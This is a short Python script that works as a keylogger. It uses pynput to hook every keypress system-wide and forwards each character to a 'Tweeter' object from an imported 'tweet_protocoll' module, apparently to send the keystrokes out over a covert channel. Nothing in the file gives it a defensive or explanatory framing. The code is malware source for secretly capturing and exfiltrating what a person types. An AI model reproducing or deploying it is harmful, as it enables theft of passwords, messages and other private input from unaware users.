from pynput import keyboard

from tweet_protocoll import Tweeter

t = Tweeter(1)

def on_press(key):
    if key == keyboard.Key.space:
        key = " "
    elif key == keyboard.Key.enter:
        key = "\n"
    elif key == keyboard.Key.tab:
        key = "\t"
    else:
        key = str(key)[1]

    t.tweet(key)


def on_release(key):
    pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
    l.join()